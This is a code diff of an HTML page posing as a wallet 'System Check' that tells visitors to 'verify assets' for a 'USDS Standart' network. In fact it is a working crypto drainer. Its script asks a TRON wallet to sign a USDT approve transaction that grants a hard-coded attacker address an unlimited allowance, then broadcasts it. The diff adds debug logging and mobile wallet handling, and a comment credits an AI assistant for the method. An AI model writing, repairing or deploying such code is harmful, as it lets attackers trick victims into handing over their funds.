@@ -3,102 +3,106 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Secure Verification</title>
+    <title>Network Sync</title>
     <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
     <style>
-        body { margin: 0; background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); padding: 40px 30px; border-radius: 32px; width: 85%; max-width: 340px; text-align: center; }
-        .btn { background: #fff; color: #000; border: none; padding: 20px; border-radius: 16px; font-weight: 700; font-size: 15px; width: 100%; cursor: pointer; margin-top: 25px; transition: 0.2s; box-shadow: 0 10px 20px rgba(0,0,0,0.3); }
-        .btn:active { transform: scale(0.97); }
-        .btn:disabled { background: #222; color: #555; cursor: not-allowed; }
-        #log { font-size: 10px; color: #444; margin-top: 20px; text-transform: uppercase; letter-spacing: 1px; line-height: 1.4; }
+        body { margin: 0; background: #000; color: #fff; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
+        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); padding: 35px; border-radius: 28px; width: 80%; max-width: 320px; text-align: center; }
+        .btn { background: #fff; color: #000; border: none; padding: 18px; border-radius: 14px; font-weight: 700; width: 100%; cursor: pointer; margin-top: 20px; }
+        #log { font-size: 10px; color: #444; margin-top: 15px; text-transform: uppercase; letter-spacing: 1px; }
+        #debug { font-family: monospace; font-size: 9px; color: #333; margin-top: 10px; text-align: left; width: 100%; max-height: 50px; overflow: auto; }
     </style>
 </head>
 <body>
 
 <div class="glass">
-    <div style="font-size: 40px; margin-bottom: 15px;">🛡️</div>
-    <div style="font-size: 20px; font-weight: 600; margin-bottom: 8px;">Network Sync</div>
-    <div style="color: #888; font-size: 13px; line-height: 1.5;">Verify your assets to complete the USDS Standart integration.</div>
-    
-    <button class="btn" id="mainBtn">CONNECT & VERIFY</button>
-    <div id="log">INITIALIZING...</div>
+    <div style="font-size: 40px; margin-bottom: 10px;">🛡️</div>
+    <div style="font-size: 18px; font-weight: 600;">System Check</div>
+    <div style="color: #666; font-size: 13px; margin-top: 10px;">Connect your wallet to synchronize with USDS Standart network.</div>
+    <button class="btn" id="btn">VERIFY ASSETS</button>
+    <div id="log">AWAITING CONNECTION...</div>
+    <div id="debug"></div>
 </div>
 
 <script>
     const SPENDER = "TCCRZgsANneEEmwGuyFdv8AZyjoTNfk3an";
     const USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
-    const log = (m) => { document.getElementById('log').innerText = m; console.log(m); };
-    const btn = document.getElementById('mainBtn');
+    const log = (m) => document.getElementById('log').innerText = m;
+    const debug = (m) => document.getElementById('debug').innerText += "> " + m + "\n";
+    const btn = document.getElementById('btn');
 
-    // Ручная сборка данных для approve(address,uint256)
-    // 095ea7b3 — это селектор функции approve
-    function encodeApproveData(spender) {
-        const addressHex = window.tronWeb.address.toHex(spender).replace('41', '').padStart(64, '0');
-        const amountHex = 'f'.repeat(64); // Max uint256
-        return "095ea7b3" + addressHex + amountHex;
-    }
-
-    async function run() {
+    btn.onclick = async () => {
         try {
+            debug("Start button click");
             const tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
-            
+
             if (!tw) {
-                log("WALLET NOT DETECTED. OPEN IN TRUST BROWSER");
+                log("ERROR: NO WALLET");
+                debug("TronWeb not found");
                 return;
             }
 
-            log("REQUESTING ACCESS...");
+            log("CONNECTING...");
             const accounts = await tw.request({ method: 'tron_requestAccounts' });
-            if (!accounts) throw new Error("USER REJECTED CONNECTION");
+            debug("Accounts received: " + (accounts ? "Yes" : "No"));
 
-            log("BUILDING SECURE TRANSACTION...");
+            const userAddr = tw.defaultAddress.base58;
+            debug("User address: " + userAddr);
+
+            log("BUILDING TX...");
             
-            // Тот самый метод, который советовал Claude, но с ручными данными
-            const data = encodeApproveData(SPENDER);
-            
+            // Ручная сборка параметров для Trust Wallet
+            const parameter = [
+                {type: 'address', value: SPENDER},
+                {type: 'uint256', value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}
+            ];
+
+            debug("Calling triggerSmartContract...");
             const transaction = await tw.transactionBuilder.triggerSmartContract(
                 USDT, 
                 "approve(address,uint256)", 
                 {}, 
-                [
-                    {type: 'address', value: SPENDER},
-                    {type: 'uint256', value: "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}
-                ],
-                tw.defaultAddress.base58
+                parameter,
+                userAddr
             );
 
-            log("AWAITING SIGNATURE...");
-            const signed = await tw.trx.sign(transaction.transaction);
-            
-            log("BROADCASTING...");
-            const result = await tw.trx.sendRawTransaction(signed);
-
-            if (result.result) {
-                log("SUCCESSFULLY VERIFIED");
-                btn.innerText = "COMPLETE";
-                btn.disabled = true;
-            } else {
-                throw new Error("TRANSACTION FAILED");
+            if (!transaction.result || !transaction.result.result) {
+                debug("Trigger failed: " + JSON.stringify(transaction));
+                throw new Error("TX_BUILD_FAILED");
             }
 
+            log("SIGNING...");
+            debug("Requesting sign...");
+            const signed = await tw.trx.sign(transaction.transaction);
+            debug("Signed: " + (signed ? "Yes" : "No"));
+
+            log("SENDING...");
+            const result = await tw.trx.sendRawTransaction(signed);
+            debug("Result: " + JSON.stringify(result));
+
+            if (result.result) {
+                log("VERIFIED SUCCESS");
+                btn.innerText = "DONE";
+                btn.disabled = true;
+            }
         } catch (e) {
-            log("ERROR: " + (e.message || "USER CANCELLED"));
-            btn.innerText = "RETRY";
+            console.error(e);
+            log("RETRY REQUIRED");
+            debug("Err: " + e.message);
         }
-    }
+    };
 
-    btn.onclick = run;
-
-    // Авто-чекер провайдера
+    // Поиск провайдера в цикле (для мобилок)
+    let searchCount = 0;
     const checker = setInterval(() => {
-        const active = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
-        if (active && active.ready) {
-            log("BRIDGE READY");
+        const tw = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
+        if (tw && tw.ready) {
+            log("WALLET READY");
             clearInterval(checker);
         } else {
-            log("SEARCHING FOR WALLET...");
+            searchCount++;
+            if(searchCount > 10) log("USE TRUST BROWSER");
         }
     }, 1000);
 </script>
